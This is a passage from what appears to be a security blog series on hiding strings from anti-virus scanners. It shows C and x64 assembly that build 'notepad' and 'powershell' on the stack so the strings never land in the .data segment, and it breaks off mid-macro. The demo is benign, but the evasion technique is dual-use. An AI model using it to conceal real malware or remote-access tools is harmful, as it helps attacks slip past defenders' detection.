<span class="w">    </span><span class="no">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">r12</span><span class="w">         </span><span class="c1">; Call &quot;ShellExecuteA&quot;, jump to addres</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">         </span><span class="c1">; Release &quot;notepad&quot; string from stack</span>

<span class="w">    </span><span class="c1">;; = END SHELLEXECUTEA ===========================================</span>

<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
</code></pre></div>

<p>I know there's a lot to digest with the code above. I've made the flow similar to the flow of the C program so you can review them side by side if you feel lost. Hopefully, the comments and the separators would also help.</p>
<blockquote>
<p><strong>Note:</strong> Pay special attention to how the stack is reserved (with <code>sub rsp, 16</code>) and released (with <code>add rsp, 16</code>). I did not discuss stack alignments as it's a lengthy explanation in itself. But just remember that we are releasing the data once we've finished passing it to the function.</p>
</blockquote>
<p>If done correctly, the strings would not be detectable because the data is now on the stack and not in the <code>.data</code> segment.</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-2-06" src="../images/string-anti-virus-evasion-in-x64-assembly-part-2-06.png" /></p>
<hr />
<p>It is important to note that anti-viruses can employ different techniques to do detection, but a huge part of their functionality will rely on detecting malicious strings. So at least, on that front, we now have an idea on how to defeat it.</p>
<p>You can view the code for part 1 and 2 <a href="https://github.com/accidentalrebel/string-anti-virus-evasion-x64-assembly">on Github</a>. Updates and fixes will be placed there.</p>
<p>I might post more assembly shenanigans in the future, so stay tuned.</p>
<p>And as always, for any questions or comments, feel free to reach out to me on <a href="https://twitter.com/accidentalrebel">Twitter</a> or <a href="https://www.linkedin.com/in/juan-karlo-licudine/">LinkedIn</a>.</p>
        </div>

        <div class="tags">
            <a href="../tag/evasion.html" class="tag">evasion</a>
            <a href="../tag/assembly.html" class="tag">assembly</a>
            <a href="../tag/av.html" class="tag">av</a>
        </div>
    </article>
    <article class="post-item">
        <header class="article-header">
            <h2 class="post-title">
                <a href="../string-av-evasion-in-x64-assembly-part-1.html">String anti-virus evasion in x64 assembly (Part 1)</a>
            </h2>
            <div class="article-meta">
                <time datetime="2022-07-08T12:11:00+08:00">Fri 08 July 2022</time>
                <span>•</span>
                <a href="../category/misc.html">misc</a>
            </div>
        </header>

        <div class="article-content">
            <p>One of the features I implemented for my <a href="https://github.com/accidentalrebel/RATwurst">Remote Access Tool</a> was an anti-virus evasion capability in the form of strings obfuscation. It wouldn't fool an EDR or a reverse engineer but it was quick to implement so I added it. </p>
<p>This was over a year ago. I decided to revisit this feature to try and understand it better and find out if it is actually effective.</p>
<h2 id="what-to-expect">What to expect</h2>
<p>In this two-part blog post I will look into the following:</p>
<ul>
<li>Hiding argument strings</li>
<li>Hiding API call strings</li>
</ul>
<p>THe one you reading now is about the first one. I will be explaining how it's done in C and later convert it to x64 Windows Assembly so we can better understand what's happening under the hood.</p>
<h2 id="hiding-function-argument-strings">Hiding function argument strings</h2>
<p>I got the idea for this AV evasion technique from <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">this blog post</a>. The author posits that one part of an anti-virus detection capability is through checking for suspicious strings in an executable.</p>
<p>For the purpose of this post, let's pretend that "notepad" is a suspicious string that we don't want be detected by the anti-virus.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;shellapi.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;notepad&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<blockquote>
<p>You might think that a call to <code>ShellExecute</code> is already a big red flag, and you are right. It is! But we'll talk about hiding API calls on the next post. Let's focus on the parameter for now.</p>
</blockquote>
<p>In the place of the anti-virus, we'll be using the <code>strings</code> command to check for visible strings like so:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-01" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-01.png" /></p>
<p>As expected, the word "notepad" is easily detected. This is becaues any string that we declare and initialize in a program gets placed in the <code>.data</code> segment in memory by the compiler:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-02" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-02.png" /></p>
<p>To prevent detection, we need a way for the string to not be present in our compiled executable.</p>
<h2 id="the-solution">The solution</h2>
<p>The solution is to declare the string to be passed as the parameter like so:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;p&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
</code></pre></div>

<p>And when <code>strings</code> is run, we now see that the "notepad" string is not present anymore.</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-03" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-03.png" /></p>
<p>How did this happen?</p>
<p>This is because data contained in arrays are placed on the stack instead of the <code>.data</code> segment when declared within a function (And also, as long as it is not declared as static).</p>
<p>To further understand how this happens, let's convert this C program into x64 assembly.</p>
<h2 id="converting-to-x64-assembly">Converting to x64 assembly</h2>
<p>First, we setup our boilerplate code with an entry point and a call to <code>ExitProcess</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>

<span class="nl">main:</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>

<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
</code></pre></div>

<p>Before we can call <code>ShellExecute</code>, we first need to import the <code>ShellExecuteA</code> symbol using <code>extern</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">    </span><span class="na">...</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ShellExecuteA</span>
</code></pre></div>

<hr />
<h3 id="aside-why-shellexecutea-and-not-shellexecute">Aside: Why ShellExecuteA and not ShellExecute?</h3>
<blockquote>
<p>Because if you would look in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">MSDN documentation</a>, you would find that there really isn't a <code>ShellExecute</code> function available. There are <code>ShellExecuteA</code> (For ANSI strings) and <code>ShellExecuteW</code> (For Unicode strings), however. <code>ShellExecute</code> is just a macro for these two functions. We can confirm this by looking at the <code>shellapi.h</code> source code.</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="cp">#ifdef UNICODE</span>
<span class="cp">#define ShellExecute  ShellExecuteW</span>
<span class="cp">#else</span>
<span class="cp">#define ShellExecute  ShellExecuteA</span>
<span class="cp">#endif </span><span class="c1">// !UNICODE</span>
</code></pre></div>

<blockquote>
<p>Since assembly does not use header files we can just call <code>ShellExecuteA</code> or <code>ShellExecuteW</code> directly. In this example, we won't be needing unicode support so we're going to be using the former.</p>
</blockquote>
<hr />
<p>Before we call the function in assembly, let's go back and take a look at how we did it in C.</p>
<div class="codehilite"><pre><span></span><code><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;notepad&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
</code></pre></div>

<p>We have 5 paremeters to pass to the function. Here's how we can write this in assembly using the Microsoft <a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling conventions</a>.</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span><span class="w">              </span><span class="c1">; nShowCmd ; SW_SHOW == 0x5</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span><span class="w">              </span><span class="c1">; lpDirectory ; NULL == 0x0</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span><span class="w">               </span><span class="c1">; lpParameters ; Clear register == NULL</span>

<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_notepad</span><span class="p">]</span><span class="w">    </span><span class="c1">; lpFile</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w">      </span><span class="c1">; lpOperation</span>

<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span><span class="w">             </span><span class="c1">; hwnd</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ShellExecuteA</span><span class="w">    </span><span class="c1">; Call function</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
</code></pre></div>

<p>We then initialize the strings by adding a data segment section:</p>
<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
<span class="w">    </span><span class="nf">msg_open</span><span class="w">    </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">open</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_notepad</span><span class="w"> </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">notepad</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
</code></pre></div>

<p>For reference, here is our full code so far:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
<span class="w">    </span><span class="nf">msg_open</span><span class="w">    </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">open</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nf">msg_notepad</span><span class="w"> </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">notepad</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ShellExecuteA</span>

<span class="nl">main:</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>

<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>

<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_notepad</span><span class="p">]</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w"> </span>
<span class="w">    </span><span class="no">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span><span class="w">    </span>

<span class="w">    </span><span class="no">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ShellExecuteA</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
</code></pre></div>

<p>Take note that this version of the code is still the one where the "notepad" string is detectable.</p>
<p>To hide this string we need to apply the same solution we did to our C code; which is to place the data on the stack so that it would not be placed in the <code>.data</code> segment.</p>
<p>Here is how we did it in C:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;p&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
</code></pre></div>

<p>And here is how to do it in assembly:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">             </span><span class="c1">; Reserve space on stack for string</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="mi">0x0</span><span class="w">   </span>
<span class="w">    </span><span class="no">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span><span class="w">          </span><span class="c1">; Load address of string to r8</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">             </span><span class="c1">; Reclaim space</span>
</code></pre></div>

<p>Here's a summary of the the above code:</p>
<ul>
<li>Since our string is 8 characters long (Including the <code>0x0</code> or <code>NULL</code> terminator), we reserve space on the stack with <code>sub rsp, 8</code>. </li>
<li>Each character is then placed individually in the reserved space using <code>move byte</code> while adding an offset to <code>rsp</code>.</li>
<li>The address pointed to by <code>rsp</code> is then loaded to the <code>r8</code> register (This holds our 3nd parameter).</li>
<li>We reclaim our reserved space using <code>add rsp, 8</code>.</li>
</ul>
<p>After the code above, <code>r8</code> would now point to the location in the stack where our string resides:</p>
<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-04" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-04.png" /></p>
<hr />
<h3 id="aside-what-if-we-have-longer-strings">Aside: What if we have longer strings?</h3>
<blockquote>
<p>If we have a longer string like "powershell", then we need to reserve more space on the stack.
Take note, however that when reserving space we need to maintain the <em>stack alignment</em> so we add and subtract by multiples of 8.
The "powershell" string has 11 characters so we use 16.</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">w</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">r</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">s</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">h</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">8</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">9</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">l</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">10</span><span class="p">],</span><span class="w"> </span><span class="mi">0x0</span>

<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
</code></pre></div>

<hr />
<p>With this final version of the code, "notepad" will not be visible to <code>strings</code> anymore.</p>
<p>Here is our final code:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
<span class="w">    </span><span class="nf">msg_open</span><span class="w">    </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">open</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>

<span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ShellExecuteA</span>

<span class="nl">main:</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>

<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span>
<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="mi">0x0</span><span class="w">   </span>
<span class="w">    </span><span class="no">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>

<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w"> </span>
<span class="w">    </span><span class="no">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span><span class="w">    </span>

<span class="w">    </span><span class="no">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ShellExecuteA</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>

<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
</code></pre></div>

<h2 id="hiding-at-scale">Hiding at scale</h2>
<p>Writing the code above can get a little tedious especially if we want to pass a really long string. Thankfully, we can use a macro like the one I've written below:</p>
<div class="codehilite"><pre><span></span><code><span class="err">%</span><span class="nf">macro</span><span class="w">  </span><span class="no">addstr2stack</span><span class="w">    </span><span class="mi">1</span><span class="p">-*</span>
<span class="w">    </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">i</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="err">%</span><span class="nf">assign</span><span class="w"> </span><span class="no">j</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="err">%</span><span class="na">rep</span><span class="w">    </span><span class="err">%0</span>
